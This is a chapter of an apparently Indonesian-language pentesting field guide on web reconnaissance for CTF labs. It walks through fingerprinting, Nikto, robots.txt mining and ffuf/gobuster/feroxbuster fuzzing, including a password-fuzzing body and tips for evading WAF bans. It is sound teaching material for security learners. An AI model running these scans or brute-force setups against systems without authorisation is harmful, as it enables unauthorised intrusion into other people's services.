---
id: "15"
title: "15. Web Reconnaissance & Enumeration Workflow — Master Field Guide"
category: "3. Web Exploitation"
categoryId: "web"
filename: "15_web_recon_workflow.md"
refs_out: ["01","03","06","14d","16","17a","17b","17c","18","19","22","23","24","25","26","30"]
refs_in: ["04","06","07","09","13","14d","16","17a","20","44","61","62","64"]
---

# 15. Web Reconnaissance & Enumeration Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Web Application Reconnaissance & Surface Mapping Workflow
SERVICE TARGET     : HTTP (TCP 80), HTTPS (TCP 443), Custom Web Ports (8080, 8000, 8443, 5000)
DEFAULT PROTOCOLS  : HTTP/1.1, HTTP/2, WebSocket, REST API, GraphQL
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi), [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh), [📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS](/docs/redis-and-mongodb)
==================================================================================
```

---

## 🌐 BAGIAN 1: WEB RECON PHILOSOPHY

### 1.1 Kenapa Web Recon Berbeda dari Network Recon?

Dalam metodologi pentest jaringan tradisional (File 01-14d), kita berfokus pada **port dan service level protocol** (SSH, FTP, SMB, MySQL, Redis). Service-service tersebut memiliki spesifikasi RFC yang baku dan command set yang terbatas. Namun, begitu Anda menemukan port web (80, 443, 8080, 5000), Anda tidak lagi berhadapan dengan satu protokol statis, melainkan dengan **seluruh ekosistem perangkat lunak kustom**.

```text
+=============================================================================+
|                  ANALOGI: NETWORK RECON VS WEB RECON                        |
+=============================================================================+
|                                                                             |
|  1. Network Recon (Nmap / Service Port):                                     |
|     "Melihat denah luar rumah dan mengecek pintu gerbang."                 |
|     - Pintu SSH terbuka (Port 22)? Cek versi banner, tes auth / key.        |
|     - Pintu SMB terbuka (Port 445)? Cek null session, list share IPC$.       |
|     - Sifatnya terstandarisasi, cepat dipetakan, perilakunya seragam.       |
|                                                                             |
|  2. Web Recon (Port 80 / 443 / 8080):                                       |
|     "Masuk ke dalam rumah dan membuka setiap lemari, laci, dan amplop."     |
|     - Setiap URL adalah ruangan baru.                                       |
|     - Setiap input field, parameter query, dan header adalah potensi RCE.   |
|     - Developer bebas menulis kode apa saja (PHP, Node.js, Python, Java).   |
|     - Business logic flaws, hidden API, forgotten backup, broken auth.      |
|                                                                             |
+=============================================================================+
```

**Kenapa Web adalah Pintu Masuk (Initial Foothold) Paling Umum di CTF?**
1. **Attack Surface Terbesar**: Web server modern dibangun di atas tumpukan ribuan dependensi (framework, ORM, database driver, templating engine, library pihak ketiga). Satu kerentanan pada template engine (SSTI) atau upload form sudah cukup untuk mendatangkan reverse shell.
2. **Bypass Firewall Standar**: Port 80 dan 443 hampir selalu dibuka ke publik tanpa filtering IP ketat.
3. **Human Developer Factor**: Kesalahan sanitasi parameter (SQLi, Command Injection, LFI) dan kebocoran kredensial hardcoded pada file JavaScript atau `.env` adalah kesalahan manusia nomor satu di dunia nyata maupun lab CTF.

---

### 1.2 Web Recon Mental Model

Reconnaissance web dibagi menjadi dua pilar utama: **Pasif (Silent Recon)** dan **Aktif (Direct Probing)**.

```text
                             TARGET WEB APPLICATION
                                       │
         ┌─────────────────────────────┴─────────────────────────────┐
         ▼                                                           ▼
  PASIF (Silent Recon)                                       AKTIF (Direct Probing)
  (Tanpa menyentuh server target)                            (Traffic langsung ke target)
  │                                                                        │
  ├── 1. Google Dorking                                      ├── 1. Technology Detection (WhatWeb, curl)
  ├── 2. Shodan / Censys                                     ├── 2. Information Disclosure (robots/sitemap)
  ├── 3. Wayback Machine / Archive.org             ├── 3. Directory & File Fuzzing (ffuf)
  ├── 4. Certificate Transparency (crt.sh)              ├── 4. Source Code & JS Analysis (DevTools)
  └── 5. DNS History & WHOIS                            ├── 5. Virtual Host Fuzzing (Host headers)
                                      └── 6. Parameter Mining & Discovery (Arjun)

```

### 1.3 Urutan Web Recon yang Benar

Jangan pernah langsung menjalankan `ffuf` atau `gobuster` secara membabi buta begitu melihat port 80 terbuka! Fuzzing tanpa informasi konteks adalah penyebab nomor satu scan macet, false positive ribuan baris, atau membuang waktu 2 jam mencari file yang ekstensinya salah.

**Urutan Eksekusi yang Disiplin & Terbukti di HTB/THM:**

1. **Technology Detection Dulu**: Cari tahu apakah backend menggunakan PHP, Python Flask, Node.js Express, ASP.NET, atau CMS WordPress. Mengetahui teknologi menentukan ekstensi file apa yang harus di-fuzz.
2. **Cek `robots.txt` dan `sitemap.xml`**: Harta karun gratis yang sering ditinggalkan developer. Dapatkan path sensitif dalam 3 detik tanpa fuzzing.
3. **Directory Fuzzing (Broad First)**: Temukan folder-folder induk (`/admin/`, `/api/`, `/uploads/`, `/dev/`, `/backup/`).
4. **File Fuzzing dengan Ekstensi Spesifik**: Fuzzing nama file di dalam direktori temuan menggunakan ekstensi relevan (contoh: `.php`, `.bak`, `.old`, `.zip` jika PHP; `.js`, `.json`, `.env` jika Node.js).
5. **Virtual Host & Subdomain Enumeration**: Cek apakah server meng-host aplikasi tersembunyi lain melalui manipulasi header `Host:`.
6. **Source Code & JavaScript Analysis**: Periksa comment HTML, skrip JavaScript internal, file source map (`.map`), dan deteksi `.git` terbuka.
7. **Parameter Discovery**: Fuzzing query string (`?id=`, `?page=`, `?debug=`, `?cmd=`) pada endpoint yang tampak dinamis.

---

## 🔍 BAGIAN 2: TECHNOLOGY DETECTION

Sebelum meluncurkan fuzzing atau mengeksploitasi celah, Anda **wajib** mengetahui apa yang berjalan di balik web target. Mengetahui tumpukan teknologi (*technology stack*) mempersempit ribuan kemungkinan menjadi jalur serangan yang presisi.

### 2.1 WhatWeb — The Standard Fingerprinter

`whatweb` adalah tool fingerprinting web bawaan Parrot OS yang mengenali content management systems (CMS), blogging platforms, JavaScript libraries, web servers, dan embedded devices.

```bash
# 1. Install whatweb di Parrot OS / Debian (jika belum ada)
sudo apt update && sudo apt install whatweb -y

# 2. Scan dasar (Aggression Level 1 - Pasif / Non-intrusif)
whatweb http://TARGET

# 3. Aggression Level 3 (Agresif - Mengirim probing request tambahan)
whatweb -a 3 http://TARGET

# 4. Verbose output dengan penjelasan plugin lengkap
whatweb -v -a 3 http://TARGET

# 5. Export hasil ke JSON dan format teks untuk dokumentasi
whatweb http://TARGET --log-json=whatweb.json --log-brief=whatweb_summary.txt
```

**Contoh Output Nyata WhatWeb & Analisis:**

```text
$ whatweb -a 3 http://10.10.11.230
http://10.10.11.230 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ],
HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.230],
JQuery[3.6.0], MetaGenerator[WordPress 5.8.2], PHP[7.4.3], Script[text/javascript],
Title[Secure Corporate Portal - Login], UncommonHeaders[x-redirect-by],
WordPress[5.8.2], X-Powered-By[PHP/7.4.3]
```

**Analisis Temuan:**
- **Web Server**: `Apache 2.4.52 (Ubuntu)` → Target menjalankan Linux Ubuntu.
- **Programming Language**: `PHP 7.4.3` → Semua file fuzzing wajib menyertakan ekstensi `.php`, `.php.bak`, `.inc`.
- **CMS**: `WordPress 5.8.2` → Langsung picu alur spesifik CMS (jalankan `wpscan`, periksa `/wp-admin/`, `/wp-content/plugins/`).
- **Session Cookie**: `PHPSESSID` → Mengonfirmasi arsitektur PHP native session.

### 2.2 Wappalyzer CLI (webanalyze)

Wappalyzer versi terminal menggunakan database pengenalan teknologi terkini yang sangat akurat mengenali UI framework (Bootstrap, Tailwind, React, Vue) dan backend libraries.

```bash
# Install webanalyze via Golang di Parrot OS
sudo apt install golang -y
go install -v github.com/rverton/webanalyze/cmd/webanalyze@latest
sudo cp ~/go/bin/webanalyze /usr/local/bin/

# Update database teknologi
webanalyze -update

# Scan single target dengan kedalaman crawl 2
webanalyze -host http://TARGET -crawl 2
```

**Contoh Output webanalyze:**

```text
$ webanalyze -host http://10.10.11.189 -crawl 1
http://10.10.11.189 (200 OK)
  - Apache (Web servers)
  - Express (Web frameworks)
  - Node.js (Programming languages)
  - Bootstrap 5.1.3 (UI frameworks)
  - Socket.io (WebSocket libraries)
```

*(Implikasi: Target menggunakan arsitektur Node.js Express dengan reverse proxy Apache. Fuzzing file `.php` akan sia-sia! Prioritaskan endpoint API, file `.json`, dan pemeriksaan WebSocket).*

### 2.3 cURL untuk Header Analysis

Jangan meremehkan `curl`. Analisis HTTP response header secara mentah sering kali mengungkap rahasia yang disembunyikan oleh browser.

```bash
# 1. HEAD request (Hanya ambil header, tanpa men-download body konten)
curl -I http://TARGET

# 2. Verbose mode (Melihat TLS handshake dan raw request/response headers)
curl -v http://TARGET

# 3. Follow redirect (Sangat penting jika target me-redirect port 80 ke 443)
curl -I -L http://TARGET

# 4. Abaikan sertifikat SSL tidak valid (Self-signed certificate di CTF)
curl -I -k https://TARGET

# 5. Ambil response header beserta halaman utama secara silent
curl -i -s http://TARGET | head -n 30
```

**HTTP Headers Vital yang Wajib Diperiksa:**

```text
$ curl -I -s http://10.10.11.155
HTTP/1.1 200 OK
Date: Fri, 04 Sep 2026 14:00:00 GMT
Server: Werkzeug/2.0.2 Python/3.9.7          <-- [VITAL] Python Flask Framework terdeteksi!
Content-Type: text/html; charset=utf-8
Content-Length: 4210
Set-Cookie: session=eyJhZG1pbiI6ZmFsc2V9... <-- [VITAL] Base64 / JWT Flask cookie (SSTI / Cookie Tampering!)
X-Powered-By: Phusion Passenger 6.0.12       <-- [VITAL] Application Server Container
Access-Control-Allow-Origin: *              <-- CORS Misconfiguration
Location: /dashboard/v1                     <-- Redirect target endpoint
```


### 2.4 Nikto Web Vulnerability Scanner

Nikto adalah scanner web klasik yang sangat efektif mencari file konfigurasi usang, server misconfigurations, file default instalasi, dan file berbahaya yang tertinggal.

```bash
# 1. Scan standar port 80 HTTP
nikto -h http://TARGET

# 2. Scan HTTPS (Nikto 2.5+ otomatis mendeteksi protokol HTTPS dari URL)
nikto -h https://TARGET

# 3. Scan HTTPS port custom atau target berbasis IP/host (Kompatibilitas Versi):
nikto -h TARGET -port 443 -ssl   # Eksplisit SSL (Nikto legacy / versi lama)
nikto -h TARGET -port 8443       # Custom HTTPS port
nikto -h https://TARGET -nossl   # Abaikan pengecekan sertifikat SSL (Force skip SSL check)

# 4. Scan port custom HTTP biasa (misal port 8080)
nikto -h http://TARGET -p 8080

# 5. Simpan output ke file teks dan HTML
nikto -h http://TARGET -output nikto_report.txt
nikto -h http://TARGET -output nikto_report.html -Format htm
```

**Aturan Penggunaan Nikto di CTF:**
- **Kelebihan**: Cepat mendeteksi `phpinfo.php`, `.bash_history`, folder `test/`, modul server rentan (misal Apache mod_negotiation).
- **Kekurangan**: Menghasilkan ribuan request bising dan sering mengeluarkan **False Positive** (misal melaporkan semua file OSVDB padahal server merespons 200 untuk semua 404).
- **Kapan Digunakan?**: Jalankan di background saat awal box dimulai, tetapi jangan menunggu Nikto selesai untuk mulai bekerja manual.

### 2.5 Manual Technology Fingerprinting

Teknologi sering meninggalkan jejak khas (*signature*) pada perilaku aplikasi:

| Indikator / Pola                              | Teknologi Terdeteksi            | Implikasi & Vektor Serangan                                                                         |
| --------------------------------------------- | ------------------------------- | --------------------------------------------------------------------------------------------------- |
| Cookie: `PHPSESSID=...`                       | PHP Native Session              | Fuzzing ekstensi `.php`, cari file upload bypass, LFI via session file di `/var/lib/php/sessions/`. |
| Cookie: `JSESSIONID=...`                      | Java Servlets (Tomcat / Spring) | Cari endpoint `/manager/html`, Java Deserialization, Spring4Shell, path traversal.                  |
| Cookie: `ASP.NET_SessionId=...`               | Microsoft ASP.NET               | Fuzzing `.aspx`, `.asmx`, `.config`, periksa ViewState deserialization.                             |
| Cookie: `connect.sid=...`                     | Node.js Express session         | Injeksi NoSQL (MongoDB), Prototype Pollution, SSTI (Pug, EJS).                                      |
| Cookie: `csrftoken` / `sessionid`             | Python Django                   | Periksa template syntax Jinja2/Django, debug mode `DEBUG = True` leaks.                             |
| Header: `Server: Werkzeug/...`                | Python Flask                    | Waspada terhadap **Server-Side Template Injection (SSTI)** pada error 404/input.                    |
| Header: `X-Powered-By: Express`               | Node.js                         | Fuzzing route API REST tanpa ekstensi (`/api/v1/auth`).                                             |
| URL: `/index.php?id=1`                        | PHP Procedural / CMS            | SQL Injection klasik, LFI `?file=`, parameter tampering.                                            |
| URL: `*.do` atau `*.action`                   | Apache Struts (Java)            | Remote Code Execution via OGNL Injection (CVE-2017-5638).                                           |
| Error 404 bertuliskan *Whitelabel Error Page* | Spring Boot Java                | Cek Spring Boot Actuators (`/actuator/env`, `/actuator/heapdump`).                                  |

---

## 🤖 BAGIAN 3: ROBOTS.TXT & SITEMAP

### 3.1 Kenapa Robots.txt WAJIB Dilihat Pertama?

Banyak pemula langsung menjalankan wordlist 200.000 kata sebelum mengecek `robots.txt`. Ini adalah kesalahan fatal!

```text
+=============================================================================+
|                  FILOSOFI ROBOTS.TXT & SITEMAP.XML                          |
+=============================================================================+
|                                                                             |
|  Robots.txt dibuat oleh web admin untuk memberitahu Search Engine           |
|  (Googlebot, Bingbot): "TOLONG JANGAN INDEKS HALAMAN RAHASIA INI!".          |
|                                                                             |
|  Banyak admin dan developer pemula lupa bahwa file ini:                     |
|  1. Dapat diakses oleh SIAPA SAJA tanpa autentikasi.                        |
|  2. Berfungsi sebagai DAFTAR GRATIS direktori paling sensitif target!       |
|  3. Menunjukkan arsitektur internal tanpa memicu alarm WAF / IDS.          |
|                                                                             |
+=============================================================================+
```

### 3.2 Workflow Analisis Robots.txt

```bash
# 1. Download dan baca langsung via curl
curl -s http://TARGET/robots.txt

# 2. Filter hanya path yang dilarang (Disallow)
curl -s http://TARGET/robots.txt | grep -i "Disallow:" | awk '{print $2}'

# 3. Uji setiap path otomatis dengan status code
for path in $(curl -s http://TARGET/robots.txt | grep -i "Disallow:" | awk '{print $2}'); do
    echo -n "[+] Testing: $path -> "
    curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET$path"
done
```

**Contoh Realistis Output robots.txt & Analisis Tiap Baris:**

```text
$ curl -s http://10.10.10.198/robots.txt
User-agent: *
Disallow: /admin/                <-- [CRITICAL] Halaman login administrator.
Disallow: /dev_backup/           <-- [GOLDMINE] Arsip source code atau database dump!
Disallow: /api/v2/private/       <-- [CRITICAL] Dokumentasi endpoint API internal.
Disallow: /uploads/raw/          <-- [VITAL] Folder tempat file upload langsung tersimpan.
Disallow: /secret_key.txt        <-- [FLAG/CRED] Hardcoded file rahasia langsung!
Disallow: /changelog.html        <-- [INFO] Berisi riwayat versi & CVE potensial.
```

| Entry Path di `robots.txt`       | Kategori Temuan      | Tindakan Lanjutan Pentester                                                    |
| -------------------------------- | -------------------- | ------------------------------------------------------------------------------ |
| `/admin/` atau `/administrator/` | Administrative Panel | Uji default credentials (`admin:admin`), bypass SQLi, brute force.             |
| `/backup/`, `/bak/`, `/old/`     | Backup Storage       | Fuzzing file arsip: `backup.zip`, `db.sql`, `site.tar.gz`.                     |
| `/uploads/`                      | User File Storage    | Cek apakah direktori memiliki *directory listing* (baca file orang lain).      |
| `/api/` atau `/swagger/`         | API Documentation    | Baca skema REST/GraphQL API untuk menemukan *Broken Object Level Auth (BOLA)*. |
| `/internal/` atau `/intranet/`   | Restricted Area      | Tes *Host Header Injection* atau *X-Forwarded-For: 127.0.0.1* untuk bypass IP. |

### 3.3 Sitemap.xml Analysis

`sitemap.xml` dirancang untuk memetakan seluruh hierarki halaman web untuk keperluan SEO. Sering kali sitemap memuat link ke halaman staging, produk yang belum dirilis, atau formulir internal.

```bash
# 1. Cek keberadaan sitemap standar
curl -s http://TARGET/sitemap.xml

# 2. Format XML rapi dengan xmllint dan ambil semua URL
curl -s http://TARGET/sitemap.xml | xmllint --format - | grep -oP '(?<=<loc>)[^<]+'

# 3. Script Python one-liner untuk parse seluruh URL sitemap
python3 -c "import urllib.request, xml.etree.ElementTree as ET; tree = ET.fromstring(urllib.request.urlopen('http://TARGET/sitemap.xml').read()); print('\n'.join(elem.text for elem in tree.iter('{http://www.sitemaps.org/schemas/sitemap/0.9}loc')))"
```

---

## 📂 BAGIAN 4: DIRECTORY & FILE FUZZING

Ini adalah **bagian terpanjang, paling sering digunakan, dan paling menentukan** dalam fase web reconnaissance. Fuzzing bertujuan menemukan rute, direktori, dan file yang tidak ditautkan di halaman utama web.

### 4.1 Tool Arsenal untuk Fuzzing

| Tool            | Kelebihan Utama                                                                               | Kelemahan                                                        | Skenario Terbaik                                          |
| --------------- | --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- | --------------------------------------------------------- |
| **ffuf**        | **Tercepat di dunia**, resource hemat, fleksibilitas filter size/words/lines tak tertandingi. | Membutuhkan pemahaman syntax filter flag yang baik.              | **CTF Default #1**, VHost fuzzing, Parameter discovery.   |
| **gobuster**    | Sintaks sederhana, stabil, output bersih, memory footprint rendah.                            | Lebih lambat dari ffuf, tidak mendukung auto-recursion mendalam. | Pemula, directory check cepat, brute force DNS subdomain. |
| **feroxbuster** | **Auto-recursion otomatis**, smart-filtering dinamis, built in Rust.                          | Menguras RAM jika target memiliki link tak terhingga (spiders).  | Deep directory traversal di aplikasi web berukuran besar. |
| **dirb**        | Built-in wordlist otomatis tanpa perlu set `-w`.                                              | Sangat lambat, single-threaded secara default.                   | Quick sanity-check darurat.                               |

### 4.2 Wordlist Arsenal

Kunci keberhasilan fuzzing 80% ditentukan oleh **kualitas wordlist**, bukan kecepatan tool!

| Nama Wordlist                   | Lokasi di Parrot OS                                                     | Karakteristik & Jumlah Baris                | Target Terbaik                   |
| ------------------------------- | ----------------------------------------------------------------------- | ------------------------------------------- | -------------------------------- |
| `common.txt`                    | `/usr/share/dirb/wordlists/common.txt`                                  | ~4.600 kata, sangat cepat (< 5 detik).      | Sanity check awal di CTF.        |
| `directory-list-2.3-medium.txt` | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`          | ~220.000 kata, terpopuler di dunia CTF.     | **Standard Fuzzing HTB/THM**.    |
| `directory-list-2.3-big.txt`    | `/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt`             | ~1.200.000 kata, sangat lengkap.            | Hard box / Proving Grounds.      |
| `raft-medium-directories.txt`   | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` | ~30.000 kata direktori nyata.               | Direktori modern framework.      |
| `raft-medium-files.txt`         | `/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`       | ~16.000 nama file umum.                     | File scanning berbasis ekstensi. |
| `quickhits.txt`                 | `/usr/share/seclists/Discovery/Web-Content/quickhits.txt`               | ~2.500 path file sensitif (`.env`, `.git`). | Quick win exposure test.         |

**Cara Install SecLists di Parrot OS (Wajib bagi setiap Pentester):**

```bash
# Install SecLists package resmi Parrot/Debian
sudo apt update && sudo apt install seclists -y

# Lokasi default setelah install:
ls -la /usr/share/seclists/

# Buat symlink ringkas agar mudah diketik di terminal:
sudo ln -s /usr/share/seclists /wordlists_sec
```

### 4.3 ffuf — MASTER WORKFLOW (The Industry King)

`ffuf` (Fuzz Faster U Fool) ditulis dalam bahasa Go dan merupakan tool tercepat untuk web fuzzing modern.

#### a) Konsep Dasar ffuf: Keyword `FUZZ`
Di mana pun Anda meletakkan kata `FUZZ`, di sanalah kata-kata dari wordlist akan disuntikkan:
- Di direktori: `http://TARGET/FUZZ`
- Di ekstensi file: `http://TARGET/index.FUZZ`
- Di sub-domain: `http://FUZZ.target.htb`
- Di parameter GET: `http://TARGET/view.php?FUZZ=1`
- Di payload POST: `-d "username=admin&password=FUZZ"`

#### b) Basic Directory Discovery

```bash
# Basic Directory Fuzzing Standar Emas CTF
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -v -ic -t 40
```

**Bedah Parameter ffuf:**
- `-u http://TARGET/FUZZ` : URL target dengan marker `FUZZ`.
- `-w <path_wordlist>` : Path file wordlist.
- `-c` : Beri warna pada output terminal (Colorized).
- `-v` : Verbose (Menampilkan URL lengkap beserta status code dan target redirect).
- `-ic` : Ignore Comments (Abaikan baris komentar `#` di dalam wordlist).
- `-t 40` : Jumlah threads konkuren (Default 40, bisa dinaikkan ke 80-100 jika jaringan stabil).

**Contoh Output Nyata ffuf Directory Discovery:**

```text
$ ffuf -u http://10.10.11.200/FUZZ -w /usr/share/dirb/wordlists/common.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

:: Method           : GET
:: URL              : http://10.10.11.200/FUZZ
:: Wordlist         : /usr/share/dirb/wordlists/common.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10s
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 45ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 44ms]
login                   [Status: 200, Size: 2450, Words: 120, Lines: 65, Duration: 48ms]
robots.txt              [Status: 200, Size: 154, Words: 14, Lines: 6, Duration: 43ms]
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 44ms]
```

#### c) File Discovery dengan Ekstensi Spesifik (`-e`)

Setelah mengetahui teknologi target (misal PHP), cari file dengan ekstensi relevan:

```bash
# File fuzzing dengan flag -e
ffuf -u http://TARGET/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -e .php,.txt,.html,.bak,.old,.zip \
     -c -t 40

# Atau gunakan wordlist khusus file (SecLists raft-medium-files):
ffuf -u http://TARGET/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -c -t 40
```

#### d) Response Filtering (SANGAT KRITIS DI CTF!)

Banyak web server modern (misal custom 404 handler) mengembalikan HTTP Status `200 OK` untuk SEMUA halaman yang diminta (disebut *Soft 404 / Wildcard Response*). Tanpa filter, ffuf akan membanjiri layar Anda dengan 220.000 hasil palsu!

```bash
# Filter Berdasarkan Status Code (-fc):
# Hilangkan status 404 dan 403 dari layar
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fc 404,403

# Filter Berdasarkan Ukuran Byte (-fs) -> PALING SERING DIPAKAI:
# Misal halaman 'Not Found' palsu selalu berukuran 1520 bytes, abaikan!
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fs 1520

# Filter Berdasarkan Jumlah Kata (-fw):
# Abaikan jika response selalu mengandung tepat 42 kata
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fw 42

# Filter Berdasarkan Jumlah Baris (-fl):
# Abaikan jika response selalu berjumlah 25 baris
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fl 25

# Filter Berdasarkan RegEx Konten (-fr):
# Sembunyikan response yang mengandung teks 'Error: Page does not exist'
ffuf -u http://TARGET/FUZZ -w wordlist.txt -fr "Page does not exist"
```

#### e) FFUF SSL / HTTPS Tips (Flag `-k` yang Wajib Diketahui)

> [!IMPORTANT]
> `ffuf` **TIDAK** otomatis mengabaikan verifikasi SSL pada target HTTPS! Jika mesin CTF menggunakan *self-signed certificate*, `ffuf` tanpa flag `-k` akan langsung error:
> `x509: certificate signed by unknown authority`

```bash
# ============================================================
# FFUF SSL / HTTPS TIPS
# ============================================================

# Flag -k untuk skip SSL certificate verification (WAJIB di target HTTPS dengan self-signed cert):
ffuf -u https://TARGET/FUZZ -w wordlist.txt -c -k

# Kombinasi lengkap untuk target HTTPS di CTF:
ffuf -u https://TARGET/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -c -k -ic -t 40 \
     -e .php,.txt,.html \
     -fs [SIZE_BASELINE]

# Contoh praktis pada IP target:
ffuf -u https://10.10.11.200/FUZZ \
     -w /usr/share/dirb/wordlists/common.txt \
     -c -k -t 40
```

#### f) Rate Control & Threading (Menghindari Ban/WAF)

```bash
# Turunkan thread jika target lambat atau memicu error 500/503
ffuf -u http://TARGET/FUZZ -w wordlist.txt -t 10

# Batasi rate request (misal 50 requests per second)
ffuf -u http://TARGET/FUZZ -w wordlist.txt -rate 50

# Tambahkan delay antar request (misal 0.2 detik per thread)
ffuf -u http://TARGET/FUZZ -w wordlist.txt -p 0.2
```

#### g) Output Options (Export Data)

```bash
# Simpan output dalam format JSON untuk di-parse skrip:
ffuf -u http://TARGET/FUZZ -w wordlist.txt -o ffuf_result.json -of json

# Simpan dalam format CSV untuk dilihat di spreadsheet:
ffuf -u http://TARGET/FUZZ -w wordlist.txt -o ffuf_result.csv -of csv

# Simpan dalam format halaman web HTML interaktif:
ffuf -u http://TARGET/FUZZ -w wordlist.txt -o ffuf_result.html -of html
```

#### h) Virtual Host Fuzzing via ffuf

```bash
# Fuzzing vhost melalui Host header (Wajib filter response size default)
ffuf -u http://TARGET \
     -H "Host: FUZZ.target.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs [SIZE_BASELINE_HALAMAN_DEFAULT] \
     -c
```

#### i) Parameter Discovery via ffuf

```bash
# 1. GET Parameter Discovery:
ffuf -u "http://TARGET/index.php?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [SIZE_HALAMAN_NORMAL] -c

# 2. POST Parameter Discovery (x-www-form-urlencoded):
ffuf -u "http://TARGET/api/action" \
     -X POST -d "FUZZ=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [SIZE_BASELINE] -c

# 3. JSON Body Parameter Discovery:
ffuf -u "http://TARGET/api/user" \
     -X POST -d '{"FUZZ":"test"}' \
     -H "Content-Type: application/json" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs [SIZE_BASELINE] -c
```

### 4.4 Gobuster — WORKFLOW

Gobuster adalah alternatif yang sangat disukai karena kesederhanaan syntax dan stabilitasnya.

```bash
# 1. Directory & File Mode ('dir'):
gobuster dir -u http://TARGET \
             -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
             -x php,txt,html,bak,zip \
             -t 40 \
             -k \
             -b 404,403

# 2. Virtual Host Mode ('vhost'):
gobuster vhost -u http://target.htb \
            -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
               --append-domain \
               -t 40

# 3. DNS Subdomain Resolution Mode ('dns'):
gobuster dns -d target.htb \
             -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
             -r 1.1.1.1
```

### 4.5 Feroxbuster — WORKFLOW (Recursive Specialist)

Feroxbuster adalah fuzzer generasi baru berkecepatan tinggi yang secara otomatis melakukan **rekursif** (jika menemukan folder `/admin/`, ia otomatis mem-fuzz isi di dalam `/admin/FUZZ`).

```bash
# 1. Basic Scan dengan Auto-Recursion (Depth 2 tingkat):
feroxbuster -u http://TARGET \
            -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
            -x php,txt,zip \
            -d 2 \
            -t 40

# 2. Smart Filter (Otomatis mendeteksi dan mengabaikan respon 404 dinamis):
feroxbuster -u http://TARGET --smart-filter

# 3. Ekstrak link dari dalam halaman HTML secara otomatis:
feroxbuster -u http://TARGET -e -x php,html
```

### 4.6 Decision Tree: Kapan Pakai Tool Mana?

```text
                           PILIHAN TOOL WEB FUZZING
                                       │
               ┌───────────────────────┴───────────────────────┐
               ▼                                               ▼
       SKENARIO CTF STANDAR                            SKENARIO KHUSUS
               │                                               │
       ┌───────┴───────┐                               ┌───────┴───────┐
       ▼               ▼                               ▼               ▼
 [Perlu Cepat   [Aplikasi Rumit                [Virtual Host   [Aplikasi Butuh
  & Fleksibel]   Banyak Folder]                 Enumeration]    Scan Rekursif]
       │               │                               │               │
       ▼               ▼                               ▼               ▼
    >> ffuf <<   >> feroxbuster <<                 >> ffuf <<   >> feroxbuster <<
   (Pilihan #1     (Auto recursion                   (-H Host:     (-d 3, otomatis
   untuk semua     otomatis mencari                   FUZZ...       menyelam ke
    kasus CTF)     anak direktori)                    -fs ...)      subfolder)
```

### 4.7 Ekstensi yang WAJIB Di-fuzz per Technology

| Technology Stack          | Ekstensi Prioritas Utama                                   | Alasan Teknis & Target Incaran                                                                             |
| ------------------------- | ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| **PHP**                   | `.php`, `.phtml`, `.php5`, `.phps`, `.inc`, `.bak`, `.old` | Source code backend, bypass filter upload (`.phtml`), file backup developer (`index.php.bak`).             |
| **Java / JSP**            | `.jsp`, `.jspx`, `.do`, `.action`, `.war`, `.jar`          | Endpoint Java Spring, Struts actions, deployment archive (.war).                                           |
| **ASP.NET**               | `.aspx`, `.ashx`, `.asmx`, `.axd`, `.config`, `.cs`        | Halaman server-side C#, HTTP Handlers, Web Service, file `web.config`.                                     |
| **Python (Flask/Django)** | `.py`, `.pyc`, `.html`, `.ini`, `.env`                     | File bytecode terkompilasi (`.pyc`), template Jinja, konfigurasi environment.                              |
| **Node.js (Express)**     | `.js`, `.json`, `.mjs`, `.env`, `.yml`                     | REST API routes, manifest package (`package.json`), environment secrets.                                   |
